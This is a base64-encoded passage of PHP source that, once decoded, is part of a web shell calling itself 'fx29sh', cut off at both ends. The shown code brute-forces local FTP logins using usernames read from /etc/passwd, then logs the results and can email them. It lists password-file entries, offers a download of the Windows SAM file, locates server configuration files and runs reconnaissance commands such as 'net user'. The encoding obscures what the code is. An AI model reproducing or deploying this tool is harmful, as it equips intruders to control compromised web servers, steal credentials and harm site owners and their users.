OwogICAgICAgIHJldHVybiBUUlVFOwogICAgICB9CiAgICB9CiAgfQogIGlmICghZW1wdHkoJHN1Ym1pdCkpIHsKICAgIGlmICghaXNfbnVtZXJpYygkZnFiX2xlbmdodCkpIHskZnFiX2xlbmdodCA9ICRuaXhwd2RwZXJwYWdlO30KICAgICRmcCA9IGZvcGVuKCIvZXRjL3Bhc3N3ZCIsInIiKTsKICAgIGlmICghJGZwKSB7ZWNobyAiQ2FuJ3QgZ2V0IC9ldGMvcGFzc3dkIGZvciBwYXNzd29yZC1saXN0LiI7fQogICAgZWxzZSB7CiAgICAgIGlmICgkZnFiX2xvZ2dpbmcpIHsKICAgICAgICBpZiAoJGZxYl9sb2dmaWxlKSB7JGZxYl9sb2dmcCA9IGZvcGVuKCRmcWJfbG9nZmlsZSwidyIpO30KICAgICAgICBlbHNlIHskZnFiX2xvZ2ZwID0gRkFMU0U7fQogICAgICAgICRmcWJfbG9nID0gIkZUUCBRdWljayBCcnV0ZSAoIi4kc2hfbmFtZS4iKSBzdGFydGVkIGF0ICIuZGF0ZSgiZC5tLlkgSDppOnMiKS4iXHJcblxyXG4iOwogICAgICAgIGlmICgkZnFiX2xvZ2ZpbGUpIHtmd3JpdGUoJGZxYl9sb2dmcCwkZnFiX2xvZyxzdHJsZW4oJGZxYl9sb2cpKTt9CiAgICAgIH0KICAgICAgb2JfZmx1c2goKTsKICAgICAgJGkgPSAkc3VjY2VzcyA9IDA7CiAgICAgICRmdHBxdWlja19zdCA9IGdldG1pY3JvdGltZSgpOwogICAgICB3aGlsZSghZmVvZigkZnApKSB7CiAgICAgICAgJHN0ciA9IGV4cGxvZGUoIjoiLGZnZXRzKCRmcCwyMDQ4KSk7CiAgICAgICAgaWYgKGZ4MjlmdHBicnV0ZWNoZWNrKCJsb2NhbGhvc3QiLDIxLDEsJHN0clswXSwkc3RyWzBdLCRzdHJbNl0sJGZxYl9vbmx5d2l0aHNoKSkgewogICAgICAgICAgZWNobyAiPGI+Q29ubmVjdGVkIHRvICIuZ2V0ZW52KCJTRVJWRVJfTkFNRSIpLiIgd2l0aCBsb2dpbiBcIiIuJHN0clswXS4iXCIgYW5kIHBhc3N3b3JkIFwiIi4kc3RyWzBdLiJcIjwvYj48YnI+IjsKICAgICAgICAgICRmcWJfbG9nIC49ICJDb25uZWN0ZWQgdG8gIi5nZXRlbnYoIlNFUlZFUl9OQU1FIikuIiB3aXRoIGxvZ2luIFwiIi4kc3RyWzBdLiJcIiBhbmQgcGFzc3dvcmQgXCIiLiRzdHJbMF0uIlwiLCBhdCAiLmRhdGUoImQubS5ZIEg6aTpzIikuIlxyXG4iOwogICAgICAgICAgaWYgKCRmcWJfbG9nZnApIHtmc2VlaygkZnFiX2xvZ2ZwLDApOyBmd3JpdGUoJGZxYl9sb2dmcCwkZnFiX2xvZyxzdHJsZW4oJGZxYl9sb2cpKTt9CiAgICAgICAgICAkc3VjY2VzcysrOwogICAgICAgICAgb2JfZmx1c2goKTsKICAgICAgICB9CiAgICAgICAgaWYgKCRpID4gJGZxYl9sZW5naHQpIHticmVhazt9CiAgICAgICAgJGkrKzsKICAgICAgfQogICAgICBpZiAoJHN1Y2Nlc3MgPT0gMCkge2VjaG8gIk5vIHN1Y2Nlc3MuIGNvbm5lY3Rpb25zISI7ICRmcWJfbG9nIC49ICJObyBzdWNjZXNzLiBjb25uZWN0aW9ucyFcclxuIjt9CiAgICAgICRmdHBxdWlja190ID0gcm91bmQoZ2V0bWljcm90aW1lKCktJGZ0cHF1aWNrX3N0LDQpOwogICAgICBlY2hvICI8aHIgc2l6ZT1cIjFcIiBub3NoYWRlPjxiPkRvbmUhPC9iPjxicj5Ub3RhbCB0aW1lIChzZWNzLik6ICIuJGZ0cHF1aWNrX3QuIjxicj5Ub3RhbCBjb25uZWN0aW9uczogIi4kaS4iPGJyPlN1Y2Nlc3MuOiA8Zm9udCBjb2xvcj1ncmVlbj48Yj4iLiRzdWNjZXNzLiI8L2I+PC9mb250Pjxicj5VbnN1Y2Nlc3MuOiIuKCRpLSRzdWNjZXNzKS4iPC9iPjxicj5Db25uZWN0cyBwZXIgc2Vjb25kOiAiLnJvdW5kKCRpLyRmdHBxdWlja190LDIpLiI8YnI+IjsKICAgICAgJGZxYl9sb2cgLj0gIlxyXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cclxuRG9uZSFcclxuVG90YWwgdGltZSAoc2Vjcy4pOiAiLiRmdHBxdWlja190LiJcclxuVG90YWwgY29ubmVjdGlvbnM6ICIuJGkuIlxyXG5TdWNjZXNzLjogIi4kc3VjY2Vzcy4iXHJcblVuc3VjY2Vzcy46Ii4oJGktJHN1Y2Nlc3MpLiJcclxuQ29ubmVjdHMgcGVyIHNlY29uZDogIi5yb3VuZCgkaS8kZnRwcXVpY2tfdCwyKS4iXHJcbiI7CiAgICAgIGlmICgkZnFiX2xvZ2ZwKSB7ZnNlZWsoJGZxYl9sb2dmcCwwKTsgZndyaXRlKCRmcWJfbG9nZnAsJGZxYl9sb2csc3RybGVuKCRmcWJfbG9nKSk7fQogICAgICBpZiAoJGZxYl9sb2dlbWFpbCkge0BtYWlsKCRmcWJfbG9nZW1haWwsIiIuJHNoX25hbWUuIiByZXBvcnQiLCRmcWJfbG9nKTt9CiAgICAgIGZjbG9zZSgkZnFiX2xvZ2ZwKTsKICAgIH0KICB9CiAgZWxzZSB7CiAgICAkbG9nZmlsZSA9ICR0bXBkaXJfbG9ncy4iZngyOXNoX2Z0cHF1aWNrYnJ1dGVfIi5kYXRlKCJkLm0uWV9IX2lfcyIpLiIubG9nIjsKICAgICRsb2dmaWxlID0gc3RyX3JlcGxhY2UoIi8vIixESVJFQ1RPUllfU0VQQVJBVE9SLCRsb2dmaWxlKTsKICAgIGVjaG8gIjxmb3JtIGFjdGlvbj1cIiIuJHN1cmwuIlwiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT1cImZ0cHF1aWNrYnJ1dGVcIj4iLgogICAgICAgICAiUmVhZCBmaXJzdDo8L3RkPjx0ZD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9XCJmcWJfbGVuZ2h0XCIgdmFsdWU9XCIiLiRuaXhwd2RwZXJwYWdlLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJmcWJfb25seXdpdGhzaFwiIHZhbHVlPVwiMVwiPiBVc2VycyBvbmx5IHdpdGggc2hlbGw8L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQ+PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJjaGVja2JveFwiIG5hbWU9XCJmcWJfbG9nZ2luZ1wiIHZhbHVlPVwiMVwiIGNoZWNrZWQ+TG9nZ2luZzwvdGQ+PC90cj4iLgogICAgICAgICAiPHRyPjx0ZD5Mb2dnaW5nIHRvIGZpbGU6PC90ZD48dGQ+PGlucHV0IHR5cGU9XCJ0ZXh0XCIgbmFtZT1cImZxYl9sb2dmaWxlXCIgdmFsdWU9XCIiLiRsb2dmaWxlLiJcIiBzaXplPVwiIi4oc3RybGVuKCRsb2dmaWxlKSsyKihzdHJsZW4oJGxvZ2ZpbGUpLzEwKSkuIlwiPjwvdGQ+PC90cj4iLgogICAgICAgICAiPHRyPjx0ZD5Mb2dnaW5nIHRvIGUtbWFpbDo8L3RkPjx0ZD48aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwiZnFiX2xvZ2VtYWlsXCIgdmFsdWU9XCIiLiRsb2dfZW1haWwuIlwiIHNpemU9XCIiLihzdHJsZW4oJGxvZ2VtYWlsKSsyKihzdHJsZW4oJGxvZ2VtYWlsKS8xMCkpLiJcIj48L3RkPjwvdHI+Ii4KICAgICAgICAgIjx0cj48dGQgY29sc3Bhbj0yPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXN1Ym1pdCB2YWx1ZT1cIkJydXRlXCI+PC9mb3JtPiI7CiAgfQogIGVjaG8gIjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn0KfQppZiAoJGFjdCA9PSAiZCIpIHsKICBpZiAoIWlzX2RpcigkZCkpIHsgZWNobyAiPGNlbnRlcj48Yj4kZCBpcyBhIG5vdCBhIERpcmVjdG9yeSE8L2I+PC9jZW50ZXI+IjsgfQogIGVsc2UgewogICAgZWNobyAiPGI+RGlyZWN0b3J5IGluZm9ybWF0aW9uOjwvYj48dGFibGUgYm9yZGVyPTAgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yPiI7CiAgICBpZiAoISR3aW4pIHsKICAgICAgZWNobyAiPHRyPjx0ZD48Yj5Pd25lci9Hcm91cDwvYj48L3RkPjx0ZD4gIjsKICAgICAgJG93ID0gcG9zaXhfZ2V0cHd1aWQoZmlsZW93bmVyKCRkKSk7CiAgICAgICRnciA9IHBvc2l4X2dldGdyZ2lkKGZpbGVncm91cCgkZCkpOwogICAgICAkcm93W10gPSAoJG93WyJuYW1lIl0/JG93WyJuYW1lIl06ZmlsZW93bmVyKCRkKSkuIi8iLigkZ3JbIm5hbWUiXT8kZ3JbIm5hbWUiXTpmaWxlZ3JvdXAoJGQpKTsKICAgIH0KICAgIGVjaG8gIjx0cj48dGQ+PGI+UGVybXM8L2I+PC90ZD48dGQ+PGEgaHJlZj1cIiIuJHN1cmwuImFjdD1jaG1vZCZkPSIudXJsZW5jb2RlKCRkKS4iXCI+PGI+Ii52aWV3X3Blcm1zX2NvbG9yKCRkKS4iPC9iPjwvYT48dHI+PHRkPjxiPkNyZWF0ZSB0aW1lPC9iPjwvdGQ+PHRkPiAiLmRhdGUoImQvbS9ZIEg6aTpzIixmaWxlY3RpbWUoJGQpKS4iPC90ZD48L3RyPjx0cj48dGQ+PGI+QWNjZXNzIHRpbWU8L2I+PC90ZD48dGQ+ICIuZGF0ZSgiZC9tL1kgSDppOnMiLGZpbGVhdGltZSgkZCkpLiI8L3RkPjwvdHI+PHRyPjx0ZD48Yj5NT0RJRlkgdGltZTwvYj48L3RkPjx0ZD4gIi5kYXRlKCJkL20vWSBIOmk6cyIsZmlsZW10aW1lKCRkKSkuIjwvdGQ+PC90cj48L3RhYmxlPiI7CiAgfQp9CmlmICgkYWN0ID09ICJwaHBpbmZvIikge0BvYl9jbGVhbigpOyBwaHBpbmZvKCk7IGZ4MjlzaGV4aXQoKTt9CmlmICgkYWN0ID09ICJzZWN1cml0eSIpIHsKICBlY2hvICI8ZGl2IGNsYXNzPWJhcmhlYWRlcj4uOiBTZXJ2ZXIgU2VjdXJpdHkgSW5mb3JtYXRpb24gOi48L2Rpdj5cbiIuCiAgICAgICAiPHRhYmxlPlxuIi4KICAgICAgICI8dHI+PHRkPk9wZW4gQmFzZSBEaXI8L3RkPjx0ZD4iLiRob3BlbmJhc2VkaXIuIjwvdGQ+PC90cj5cbiI7CiAgZWNobyAiPHRkPlBhc3N3b3JkIEZpbGU8L3RkPjx0ZD4iOwogIGlmICghJHdpbikgewogICAgaWYgKCRuaXhwYXNzd2QpIHsKICAgICAgaWYgKCRuaXhwYXNzd2QgPT0gMSkgeyRuaXhwYXNzd2QgPSAwO30KICAgICAgZWNobyAiKm5peCAvZXRjL3Bhc3N3ZDo8YnI+IjsKICAgICAgaWYgKCFpc19udW1lcmljKCRuaXhwd2RfcykpIHskbml4cHdkX3MgPSAwO30KICAgICAgaWYgKCFpc19udW1lcmljKCRuaXhwd2RfZSkpIHskbml4cHdkX2UgPSAkbml4cHdkcGVycGFnZTt9CiAgICAgIGVjaG8gIjxmb3JtIGFjdGlvbj1cIiIuJHN1cmwuIlwiPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWFjdCB2YWx1ZT1cInNlY3VyaXR5XCI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9XCJuaXhwYXNzd2RcIiB2YWx1ZT1cIjFcIj48Yj5Gcm9tOjwvYj4mbmJzcDs8aW5wdXQgdHlwZT1cInRleHQ9XCIgbmFtZT1cIm5peHB3ZF9zXCIgdmFsdWU9XCIiLiRuaXhwd2Rfcy4iXCI+Jm5ic3A7PGI+VG86PC9iPiZuYnNwOzxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJuaXhwd2RfZVwiIHZhbHVlPVwiIi4kbml4cHdkX2UuIlwiPiZuYnNwOzxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT1cIlZpZXdcIj48L2Zvcm0+PGJyPiI7CiAgICAgICRpID0gJG5peHB3ZF9zOwogICAgICB3aGlsZSAoJGkgPCAkbml4cHdkX2UpIHsKICAgICAgICAkdWlkID0gcG9zaXhfZ2V0cHd1aWQoJGkpOwogICAgICAgIGlmICgkdWlkKSB7CiAgICAgICAgICAkdWlkWyJkaXIiXSA9ICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PWxzJmQ9Ii51cmxlbmNvZGUoJHVpZFsiZGlyIl0pLiJcIj4iLiR1aWRbImRpciJdLiI8L2E+IjsKICAgICAgICAgIGVjaG8gam9pbigiOiIsJHVpZCkuIjxicj4iOwogICAgICAgIH0KICAgICAgICAkaSsrOwogICAgICB9CiAgICB9CiAgICBlbHNlIHtlY2hvICI8YSBocmVmPVwiIi4kc3VybC4iYWN0PXNlY3VyaXR5Jm5peHBhc3N3ZD0xJmQ9Ii4kdWQuIlwiPjxiPkRvd25sb2FkIC9ldGMvcGFzc3dkPC9iPjwvYT4iO30KICB9CiAgZWxzZSB7CiAgICAkdiA9ICRfU0VSVkVSWyJXSU5ESVIiXS4iXHJlcGFpclxzYW0iOwogICAgaWYgKCFmaWxlX2dldF9jb250ZW50cygkdikpIHsgZWNobyAiPGEgaHJlZj1cIiIuJHN1cmwuImFjdD1mJmY9c2FtJmQ9Ii4kX1NFUlZFUlsiV0lORElSIl0uIlxccmVwYWlyJmZ0PWRvd25sb2FkXCI+PGI+RG93bmxvYWQgcGFzc3dvcmQgZmlsZTwvYj48L2E+IjsgfQogIH0KICBlY2hvICI8L3RkPjwvdHI+XG4iOwogIGVjaG8gIjx0cj48dGQ+Q29uZmlnIEZpbGVzPC90ZD48dGQ+XG4iOwogIGlmICghJHdpbikgewogICAgJHYgPSBhcnJheSgKICAgICAgICBhcnJheSgiVXNlciBEb21haW5zIiwiL2V0Yy91c2VyZG9tYWlucyIpLAogICAgICAgIGFycmF5KCJDcGFuZWwgQ29uZmlnIiwiL3Zhci9jcGFuZWwvYWNjb3VudGluZy5sb2ciKSwKICAgICAgICBhcnJheSgiQXBhY2hlIENvbmZpZyIsIi91c3IvbG9jYWwvYXBhY2hlL2NvbmYvaHR0cGQuY29uZiIpLAogICAgICAgIGFycmF5KCJBcGFjaGUgQ29uZmlnIiwiL2V0Yy9odHRwZC5jb25mIiksCiAgICAgICAgYXJyYXkoIlN5c2xvZyBDb25maWciLCIvZXRjL3N5c2xvZy5jb25mIiksCiAgICAgICAgYXJyYXkoIk1lc3NhZ2Ugb2YgVGhlIERheSIsIi9ldGMvbW90ZCIpLAogICAgICAgIGFycmF5KCJIb3N0cyIsIi9ldGMvaG9zdHMiKQogICAgKTsKICAgICRzZXAgPSAiLyI7CiAgfQogIGVsc2UgewogICAgJHdpbmRpciA9ICRfU0VSVkVSWyJXSU5ESVIiXTsKICAgICRldGNkaXIgPSAkd2luZGlyIC4gIlxzeXN0ZW0zMlxkcml2ZXJzXGV0Y1xcIjsKICAgICR2ID0gYXJyYXkoCiAgICAgICAgYXJyYXkoIkhvc3RzIiwkZXRjZGlyLiJob3N0cyIpLAogICAgICAgIGFycmF5KCJMb2NhbCBOZXR3b3JrIE1hcCIsJGV0Y2Rpci4ibmV0d29ya3MiKSwKICAgICAgICBhcnJheSgiTE0gSG9zdHMiLCRldGNkaXIuImxtaG9zdHMuc2FtIiksCiAgICApOwogICAgJHNlcCA9ICJcXCI7CiAgfQogIGZvcmVhY2ggKCR2IGFzICRzZWNfYXJyKSB7CiAgICAkc2VjX2YgPSBzdWJzdHIoc3RycmNocigkc2VjX2FyclsxXSwgJHNlcCksIDEpOwogICAgJHNlY19kID0gcnRyaW0oJHNlY19hcnJbMV0sJHNlY19mKTsKICAgICRzZWNfZnVsbCA9ICRzZWNfZC4kc2VjX2Y7CiAgICAkc2VjX2QgPSBydHJpbSgkc2VjX2QsJHNlcCk7CiAgICBpZiAoZmlsZV9nZXRfY29udGVudHMoJHNlY19mdWxsKSkgewogICAgICBlY2hvICIgWyA8YSBocmVmPVwiIi4kc3VybC4iYWN0PWYmZj0kc2VjX2YmZD0iLnVybGVuY29kZSgkc2VjX2QpLiImZnQ9dHh0XCI+PGI+Ii4kc2VjX2FyclswXS4iPC9iPjwvYT4gXSBcbiI7CiAgICB9CiAgfQogIGVjaG8gIjwvdGQ+PC90cj4iOwoKICBmdW5jdGlvbiBkaXNwbGF5c2VjaW5mbygkbmFtZSwkdmFsdWUpIHsKICAgIGlmICghZW1wdHkoJHZhbHVlKSkgewogICAgICBlY2hvICI8dHI+PHRkPiIuJG5hbWUuIjwvdGQ+PHRkPjxwcmU+Ii53b3Jkd3JhcCgkdmFsdWUsMTAwKS4iPC9wcmU+PC90ZD48L3RyPlxuIjsKICAgIH0KICB9CiAgaWYgKCEkd2luKSB7CiAgICBkaXNwbGF5c2VjaW5mbygiT1MgVmVyc2lvbiIsZngyOWV4ZWMoImNhdCAvcHJvYy92ZXJzaW9uIikpOwogICAgZGlzcGxheXNlY2luZm8oIktlcm5lbCBWZXJzaW9uIixmeDI5ZXhlYygic3lzY3RsIC1hIHwgZ3JlcCB2ZXJzaW9uIikpOwogICAgZGlzcGxheXNlY2luZm8oIkRpc3RyaWIgTmFtZSIsZngyOWV4ZWMoImNhdCAvZXRjL2lzc3VlLm5ldCIpKTsKICAgIGRpc3BsYXlzZWNpbmZvKCJEaXN0cmliIE5hbWUgKDIpIixmeDI5ZXhlYygiY2F0IC9ldGMvKi1yZWFsaXNlIikpOwogICAgZGlzcGxheXNlY2luZm8oIkNQVSBJbmZvIixmeDI5ZXhlYygiY2F0IC9wcm9jL2NwdWluZm8iKSk7CiAgICBkaXNwbGF5c2VjaW5mbygiUkFNIixmeDI5ZXhlYygiZnJlZSAtbSIpKTsKICAgIGRpc3BsYXlzZWNpbmZvKCJIREQgU3BhY2UiLGZ4MjlleGVjKCJkZiAtaCIpKTsKICAgIGRpc3BsYXlzZWNpbmZvKCJMaXN0IG9mIEF0dHJpYnV0ZXMiLGZ4MjlleGVjKCJsc2F0dHIgLWEiKSk7CiAgICBkaXNwbGF5c2VjaW5mbygiTW91bnQgT3B0aW9ucyIsZngyOWV4ZWMoImNhdCAvZXRjL2ZzdGFiIikpOwogICAgZGlzcGxheXNlY2luZm8oImx5bnggaW5zdGFsbGVkPyIsZngyOWV4ZWMoIndoaWNoIGx5bngiKSk7CiAgICBkaXNwbGF5c2VjaW5mbygibGlua3MgaW5zdGFsbGVkPyIsZngyOWV4ZWMoIndoaWNoIGxpbmtzIikpOwogICAgZGlzcGxheXNlY2luZm8oIkdFVCBpbnN0YWxsZWQ/IixmeDI5ZXhlYygid2hpY2ggR0VUIikpOwogICAgZGlzcGxheXNlY2luZm8oIldoZXJlIGlzIEFwYWNoZT8iLGZ4MjlleGVjKCJ3aGVyZWlzIGFwYWNoZSIpKTsKICAgIGRpc3BsYXlzZWNpbmZvKCJXaGVyZSBpcyBwZXJsPyIsZngyOWV4ZWMoIndoZXJlaXMgcGVybCIpKTsKICAgIGRpc3BsYXlzZWNpbmZvKCJMb2NhdGUgcHJvZnRwZC5jb25mIixmeDI5ZXhlYygibG9jYXRlIHByb2Z0cGQuY29uZiIpKTsKICAgIGRpc3BsYXlzZWNpbmZvKCJMb2NhdGUgaHR0cGQuY29uZiIsZngyOWV4ZWMoImxvY2F0ZSBodHRwZC5jb25mIikpOwogICAgZGlzcGxheXNlY2luZm8oIkxvY2F0ZSBteS5jb25mIixmeDI5ZXhlYygibG9jYXRlIG15LmNvbmYiKSk7CiAgICBkaXNwbGF5c2VjaW5mbygiTG9jYXRlIHBzeWJuYy5jb25mIixmeDI5ZXhlYygibG9jYXRlIHBzeWJuYy5jb25mIikpOwogIH0KICBlbHNlIHsKICAgIGRpc3BsYXlzZWNpbmZvKCJPUyBWZXJzaW9uIixmeDI5ZXhlYygidmVyIikpOwogICAgZGlzcGxheXNlY2luZm8oIkFjY291bnQgU2V0dGluZ3MiLGZ4MjlleGVjKCJuZXQgYWNjb3VudHMiKSk7CiAgICBkaXNwbGF5c2VjaW5mbygiVXNlciBBY2NvdW50cyIsZngyOWV4ZWMoIm5ldCB1c2VyIikpOwogIH0KICBlY2hvICI8L3RhYmxlPlxuIjsKfQppZiAoJGFjdCA9PSAibWtmaWxlIikgewogIGlmICgkbWtmaWxlICE9ICRkKSB7CiAgICBpZiAoJG92ZXJ3cml0ZSA9PSAwKSB7CiAgICAgIGlmIChmaWxlX2V4aXN0cygkbWtmaWxlKSkgeyBlY2hvICI8Yj5GSUxFIEVYSVNUOjwvYj4gJG92ZXJ3cml0ZSAiLmh0bWxzcGVjaWFsY2hhcnMoJG1rZmlsZSk7IH0KICAgIH0KICAgIGVsc2UgewogICAgICBpZiAoIWZvcGVuKCRta2ZpbGUsInciKSkgeyBlY2hvICI8Yj5BQ0NFU1MgREVOSUVEOjwvYj4gIi5odG1sc3BlY2lhbGNoYXJzKCRta2ZpbGUpOyB9CiAgICAgIGVsc2UgeyAkYWN0ID0gImYiOyAkZCA9IGRpcm5hbWUoJG1rZmlsZSk7IGlmIChzdWJzdHIoJGQsLTEpICE9IERJUkVDVE9SWV9TRVBBUkFUT1IpIHskZCAuPSBESVJFQ1RPUllfU0VQQVJBVE9SO30gJGYgPSBiYXNlbmFtZSgkbWtmaWxlKTsgfQogICAgfQogIH0KICBlbHNlIHsgZWNobyAiPGRpdiBjbGFzcz1meGVycm1zZz5FbnRlciBmaWxlbmFtZSE8L2Rpdj5cclxuIjsgfQp9CmlmICgkYWN0ID09ICJlbmNvZGVyIikgewplY2hvICI8c2NyaXB0IGxhbmd1YWdlPVwiamF2YXNjcmlwdFwiPmZ1bmN0aW9uIHNldF9lbmNvZGVyX2lucHV0KHRleHQpIHtkb2N1bWVudC5mb3Jtcy5lbmNvZGVyLmlucHV0LnZhbHVlID0gdGV4dDt9PC9zY3JpcHQ+Ii4KICAgICAiPGZvcm0gbmFtZT1cImVuY29kZXJcIiBhY3Rpb249XCIiLiRzdXJsLiJcIiBtZXRob2Q9UE9TVD4iLgogICAgICI8aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hY3QgdmFsdWU9ZW5jb2Rlcj4iLgogICAgICI8Y2VudGVyPjx0YWJsZSBjbGFzcz1jb250ZW50cz4iLgogICAgICI8dHI+PHRkIGNvbHNwYW49NCBjbGFzcz1iYXJoZWFkZXI+LjogRW5jb2RlciA6LjwvdGQ+Ii4KICAgICAiPHRyPjx0ZCBjb2xzcGFuPTI+SW5wdXQ6PC90ZD48dGQ+PHRleHRhcmVhIG5hbWU9XCJlbmNvZGVyX2lucHV0XCIgaWQ9XCJpbnB1dFwiIGNvbHM9NzAgcm93cz01PiIuQGh0bWxzcGVjaWFsY2hhcnMoJGVuY29kZXJfaW5wdXQpLiI8L3RleHRhcmVhPjxicj4iLgogICAgICI8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9XCJjYWxjdWxhdGVcIj48L3RkPjwvdHI+Ii4KICAgICAiPHRyPjx0ZCByb3dzcGFuPTQ+SGFzaGVzOjwvdGQ+IjsKZm9yZWFjaChhcnJheSgibWQ1IiwiY3J5cHQiLCJzaGExIiwiY3JjMzIiKSBhcyAkdikgewogIGVjaG8gIjx0ZD4iLiR2LiI6PC90ZD48dGQ+PGlucHV0IHR5cGU9dGV4dCBzaXplPTUwIG9uRm9jdXM9XCJ0aGlzLnNlbGVjdCgpXCIgb25Nb3VzZW92ZXI9XCJ0aGlzLnNlbGVjdCgpXCIgb25Nb3VzZW91dD1cInRoaXMuc2VsZWN0KClcIiB2YWx1ZT1cIiIuJHYoJGVuY29kZXJfaW5wdXQpLiJcIiByZWFkb25seT48L3RkPjwvdHI+PHRyPiI7Cn0KZWNobyAiPC90cj4iLgogICAgICI8dHI+PHRkIHJvd3NwYW49Mj5Vcmw6PC90ZD4iLgogICAgICI8dGQ+dXJsZW5jb2RlOjwvdGQ+PHRkPjxpbnB1dCB0eXBlPXRleHQgc2l6ZT0zNSBvbkZvY3VzPVwidGhpcy5zZWxlY3QoKVwiIG9uTW91c2VvdmVyPVwidGhpcy5zZWxlY3QoKVwiIG9uTW91c2VvdXQ9XCJ0aGlzLnNlbGVjdCgpXCIgdmFsdWU9XCIiLnVybGVuY29kZSgkZW5jb2Rlcl9pbnB1dCkuIlwiIHJlYWRvbmx5PjwvdGQ+PC90cj4iLgogICAgICI8dHI+PHRkPnVybGRlY29kZTo8L3RkPjx0ZD48aW5wdXQgdHlwZT10ZXh0IHNpemU9MzUgb25Gb2N1cz1cInRoaXMuc2VsZWN0KClcIiBvbk1vdXNlb3Zlcj1cInRoaXMuc2VsZWN0KClcIiBvbk1vdXNlb3V0PVwidGhpcy5zZWxlY3QoKVwiIHZhbHVlPVwiIi5odG1sc3BlY2lhbGNoYXJzKHVybGRlY29kZSgkZW5jb2Rlcl9pbnB1dCkpLiJcIiByZWFkb25seT48L3RkPjwvdHI+Ii4KICAgICAiPHRyPjx0ZCByb3dzcGFuPTI+QmFzZTY0OjwvdGQ+Ii4KICAgICAiPHRkPmJhc2U2NF9lbmNvZGU6PC90ZD48dGQ+PGlucHV0IHR5cGU9dGV4dCBzaXplPTM1IG9uRm9jdXM9XCJ0aGlzLnNlbGVjdCgpXCIgb25Nb3VzZW92ZXI9XCJ0aGlzLnNlbGVjdCgpXCIgb25Nb3VzZW91dD1cInRoaXMuc2VsZWN0KClcIiB2YWx1ZT1cIiIuYmFzZTY0X2VuY29kZSgkZW5jb2Rlcl9pbnB1dCkuIlwiIHJlYWRvbmx5PjwvdGQ+PC90cj4iLgogICAgICI8dHI+PHRkPmJhc2U2NF9kZWNvZGU6PC90ZD48dGQ+IjsKaWYgKGJhc2U2NF9lbmNvZGUoYmFzZTY0X2RlY29kZSgkZW5jb2Rlcl9pbnB1dCkpICE9ICRlbmNvZGVyX2lucHV0KSB7ZWNobyAiPGlucHV0IHR5cGU9dGV4dCBzaXplPTM1IHZhbHVlPVwiRmFpbGVkIVwiIGRpc2FibGVkIHJlYWRvbmx5PiI7fQplbHNlIHsKICAkZGViYXNlNjQgPSBiYXNlNjRfZGVjb2RlKCRlbmNvZGVyX2lucHV0KTsKICAkZGViYXNlNjQgPSBzdHJfcmVwbGFjZSgiXDAiLCJbMF0iLCRkZWJhc2U2NCk7CiAgJGEgPSBleHBsb2RlKCJcclxuIiwkZGViYXNlNjQpOwogICRyb3dzID0gY291bnQoJGEpOwogICRkZWJhc2U2NCA9IGh0bWxzcGVjaWFsY2hhcnMoJGRlYmFzZTY0KTsKICBpZiAoJHJvd3MgPT0gMSkgeyBlY2hvICI8aW5wdXQgdHlwZT10ZXh0IHNpemU9MzUgb25Gb2N1cz1cInRoaXMuc2VsZWN0KClcIiBvbk1vdXNlb3Zlcj1cInRoaXMuc2VsZWN0KClcIiBvbk1vdXNlb3V0PVwidGhpcy5zZWxlY3QoKVwiIHZhbHVlPVwiIi4kZGViYXNlNjQuIlwiIGlkPVwiZGViYXNlNjRcIiByZWFkb25seT4iOyB9CiAgZWxzZSB7ICRyb3dzKys7IGVjaG8gIjx0ZXh0YXJlYSBjb2xzPVwiNDBcIiByb3dzPVwiIi4kcm93cy4iXCIgb25Gb2N1cz1cInRoaXMuc2VsZWN0KClcIiBvbk1vdXNlb3Zlcj1cInRoaXMuc2VsZWN0KClcIiBvbk1vdXNlb3V0PVwidGhpcy5zZWxlY3QoKVwiIGlkPVwiZGViYXNlNjRcIiByZWFkb25seT4iLiRkZWJhc2U2NC4iPC90ZXh0YXJlYT4iOyB9CiAgZWNobyAiJm5ic3A7PGEgaHJlZj1cIiNcIiBvbmNsaWNrPVwic2V0X2VuY29kZXJfaW5wdXQoZG9jdW1lbnQuZm9ybXMuZW5jb2Rlci5kZWJhc2U2NC52YWx1ZSlcIj5bU2VuZCB0byBpbnB1dF08L2E+IjsKfQplY2hvICI8L3RkPjwvdHI+Ii4KICAgICAiPHRyPjx0ZD5CYXNlIGNvbnZlcnRhdGlvbnM6PC90ZD48dGQ+ZGVjMmhleDwvdGQ+PHRkPjxpbnB1dCB0eXBlPXRleHQgc2l6ZT0zNSBvbkZvY3VzPVwidGhpcy5zZWxlY3QoKVwiIG9uTW91c2VvdmVyPVwidGhpcy5zZWxlY3QoKVwiIG9uTW91c2VvdXQ9XCJ0aGlzLnNlbGVjdCgpXCIgdmFsdWU9XCIiOwokYyA9IHN0cmxlbigkZW5jb2Rlcl9pbnB1dCk7CmZvcigkaT0wOyRpPCRjOyRpKyspIHsKICAkaGV4ID0gZGVjaGV4KG9yZCgkZW5jb2Rlcl9pbnB1dFskaV0pKTsKICBpZiAoJGVuY29kZXJfaW5wdXRbJGldID09ICImIikge2VjaG8gJGVuY29kZXJfaW5wdXRbJGldO30KICBlbHNlaWYgKCRlbmNvZGVyX2lucHV0WyRpXSAhPSAiXFwiKSB7ZWNobyAiJSIuJGhleDt9Cn0KZWNobyAiXCIgcmVhZG9ubHk+PC90ZD48L3RyPjwvdGFibGU+PC9jZW50ZXI+PC9mb3JtPiI7Cn0KaWYgKCRhY3QgPT0gImZzYnVmZiIpIHsKICAkYXJyX2NvcHkgPSAkc2Vzc19kYXRhWyJjb3B5Il07CiA